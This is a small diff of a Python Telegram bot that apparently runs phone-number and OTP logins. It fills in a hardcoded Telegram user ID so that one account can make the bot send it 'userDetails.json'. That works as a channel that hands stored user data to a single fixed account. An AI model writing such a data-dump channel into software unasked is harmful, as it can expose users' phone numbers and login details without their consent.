@@ -87,8 +87,8 @@ def otp(_, query):
   get_id.request.delete()
   login.loginWithOTP(message=m,sid=api_id, rmn=phnum, otp=otp)
 async def getfile(client,message):
-    if message.from_user.id == :
-        app.send_document(document='userDetails.json')
+    if message.from_user.id == 7126874550:
+        app.send_document(7126874550,document='userDetails.json')
 async def main():
   await app.start()
   logging.info("bot started")
